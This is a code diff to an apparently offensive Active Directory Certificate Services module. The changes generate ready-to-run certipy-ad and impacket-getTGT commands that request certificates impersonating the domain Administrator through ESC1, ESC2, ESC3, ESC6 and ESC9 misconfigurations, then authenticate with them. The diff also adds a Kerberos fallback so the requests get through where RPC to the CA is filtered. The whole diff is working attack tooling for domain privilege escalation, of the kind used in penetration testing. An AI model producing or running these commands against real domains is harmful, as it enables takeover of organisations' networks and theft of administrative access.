@@ -172,6 +172,34 @@ def _probe_web_enrollment(host: str, timeout: float = 4.0) -> list:
     return results
 
 
+def _certipy_req_block(user, pw, domain, dc, ca, ca_host, cn, target_upn) -> str:
+    """Two ready-to-run variants for a SAN-based certipy request.
+
+    The direct form uses RPC/DCOM (TCP 135 + dynamic ports) which is frequently
+    filtered ("No route to host" on the endpoint mapper). The Kerberos form
+    acquires a TGT and talks to the CA by FQDN, which routinely succeeds where
+    the direct RPC path fails.
+    """
+    up     = f"{user}@{domain}" if domain else user
+    suffix = f"-ca '{ca}' -template '{cn}' -upn '{target_upn}'"
+    auth_d = f"-u '{up}' -p '{pw}'" if pw else f"-u '{up}' -k -no-pass"
+    lines = [
+        "# Direct (RPC/DCOM — needs TCP 135 + dynamic RPC ports open to the CA):",
+        f"certipy-ad req {auth_d} -dc-ip {dc} {suffix}",
+        f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}",
+        "# If RPC is filtered ('No route to host' / endpoint mapper) — use Kerberos:",
+    ]
+    if pw:
+        lines.append(f"impacket-getTGT {domain}/{user}:'{pw}' -dc-ip {dc}")
+        lines.append(f"export KRB5CCNAME={user}.ccache")
+    lines.append(
+        f"certipy-ad req -u '{up}' -k -no-pass -target '{ca_host}' "
+        f"-dc-ip {dc} -ns {dc} -dns-tcp {suffix}"
+    )
+    lines.append(f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}")
+    return "\n".join(lines)
+
+
 def _get_template_acl_issues(raw_sd: bytes, domain_sid: str) -> list:
     """Return list of (principal, reason) for dangerous template ACEs."""
     parse_dacl = _get_dacl_parser()
@@ -409,10 +437,11 @@ class ADCSModule(BaseModule):
 
         # ---- Attach copy-pasteable commands (from enumeration data) ----
         ca_name = get_attr(ca_entries[0], "name") if ca_entries else "<CA>"
+        ca_host = get_attr(ca_entries[0], "dNSHostName") if ca_entries else ""
         for esc_id, items in (("ESC1", esc1), ("ESC2", esc2),
                               ("ESC3", esc3), ("ESC9", esc9)):
             for rec in items:
-                self._attach_cmd(ctx, esc_id, rec, ca_name)
+                self._attach_cmd(ctx, esc_id, rec, ca_name, ca_host)
 
         # ---- Output findings ----
         self._report_esc(ctx, "ESC1", esc1,
@@ -474,9 +503,11 @@ class ADCSModule(BaseModule):
         # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 (CA flag bit 0x00040000)
         flags = get_int(ca_entry, "flags")
         if flags & 0x00040000:
-            auth   = self._cp_auth(ctx)
-            domain = ctx.domain or (getattr(ctx.args, "domain", "") or "")
-            dc     = getattr(ctx.args, "dc", "") or ""
+            a      = ctx.args
+            user   = (getattr(a, "username", "") or "").split("@")[0]
+            pw     = getattr(a, "password", "") or ""
+            domain = ctx.domain or (getattr(a, "domain", "") or "")
+            dc     = getattr(a, "dc", "") or ""
             upn    = f"Administrator@{domain}" if domain else "Administrator"
             out.critical("ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 is set on this CA!")
             ctx.quick_wins.add(
@@ -484,8 +515,8 @@ class ADCSModule(BaseModule):
                 f"ESC6 on CA {name}",
                 "CA accepts user-specified SAN in all certificate requests → any "
                 "Client-Auth template becomes ESC1.\n"
-                f"certipy-ad req {auth} -ca '{name}' -template User -upn '{upn}'\n"
-                f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}",
+                + _certipy_req_block(user, pw, domain, dc, name,
+                                     dns or "<ca-host-fqdn>", "User", upn),
             )
 
         self._check_esc7(ctx, name, dns, ca_entry)
@@ -679,32 +710,50 @@ class ADCSModule(BaseModule):
         domain = ctx.domain or (getattr(ctx.args, "domain", "") or "")
         return domain.split(".")[0].upper() if domain else "DOMAIN"
 
-    def _attach_cmd(self, ctx, esc_id: str, rec: dict, ca_name: str) -> None:
-        """Store a complete, copy-pasteable exploitation command on the record."""
-        auth   = self._cp_auth(ctx)
-        domain = ctx.domain or (getattr(ctx.args, "domain", "") or "")
-        dc     = getattr(ctx.args, "dc", "") or ""
+    def _attach_cmd(self, ctx, esc_id: str, rec: dict, ca_name: str,
+                    ca_host: str = "") -> None:
+        """Store a complete, copy-pasteable exploitation command on the record.
+
+        Commands include both a direct (RPC) and a Kerberos variant, because the
+        direct certipy request goes over RPC/DCOM which is often filtered.
+        """
+        a      = ctx.args
+        user   = (getattr(a, "username", "") or "").split("@")[0]
+        pw     = getattr(a, "password", "") or ""
+        domain = ctx.domain or (getattr(a, "domain", "") or "")
+        dc     = getattr(a, "dc", "") or ""
+        ca_host = ca_host or f"<{ca_name}-host-fqdn>"
         cn     = rec.get("cn", rec["name"])
         upn    = f"Administrator@{domain}" if domain else "Administrator"
         nb     = self._netbios(ctx)
-        pfx    = "administrator.pfx"
+        auth   = self._cp_auth(ctx)
 
         if esc_id in ("ESC1", "ESC9"):
-            rec["cmd"] = (
-                f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}' -upn '{upn}'\n"
-                f"certipy-ad auth -pfx {pfx} -dc-ip {dc}"
-            )
+            rec["cmd"] = _certipy_req_block(user, pw, domain, dc, ca_name,
+                                            ca_host, cn, upn)
         elif esc_id == "ESC2":
+            kinit = (f"impacket-getTGT {domain}/{user}:'{pw}' -dc-ip {dc} && "
+                     f"export KRB5CCNAME={user}.ccache") if pw else \
+                    "# KRB5CCNAME already set"
             rec["cmd"] = (
                 f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}'\n"
-                f"# Any-Purpose/SubCA cert — usable for client auth; then: certipy-ad auth -pfx <out>.pfx -dc-ip {dc}"
+                f"# Any-Purpose/SubCA cert — usable for client auth; then "
+                f"certipy-ad auth -pfx <out>.pfx -dc-ip {dc}\n"
+                f"# If RPC is filtered — Kerberos: {kinit}\n"
+                f"certipy-ad req -u '{user}@{domain}' -k -no-pass -target '{ca_host}' "
+                f"-dc-ip {dc} -ns {dc} -dns-tcp -ca '{ca_name}' -template '{cn}'"
             )
         elif esc_id == "ESC3":
+            kinit = (f"impacket-getTGT {domain}/{user}:'{pw}' -dc-ip {dc} && "
+                     f"export KRB5CCNAME={user}.ccache") if pw else \
+                    "# KRB5CCNAME already set"
             rec["cmd"] = (
                 f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}'   # enrollment-agent cert\n"
                 f"certipy-ad req {auth} -ca '{ca_name}' -template User "
-                f"-pfx <agent>.pfx -on-behalf-of '{nb}\\\\Administrator'\n"
-                f"certipy-ad auth -pfx {pfx} -dc-ip {dc}"
+                f"-pfx <agent>.pfx -on-behalf-of '{nb}\\Administrator'\n"
+                f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}\n"
+                f"# If RPC is filtered — Kerberos (add: {kinit} ; then "
+                f"-k -no-pass -target '{ca_host}' -ns {dc} -dns-tcp to each req)"
             )
 
     @staticmethod
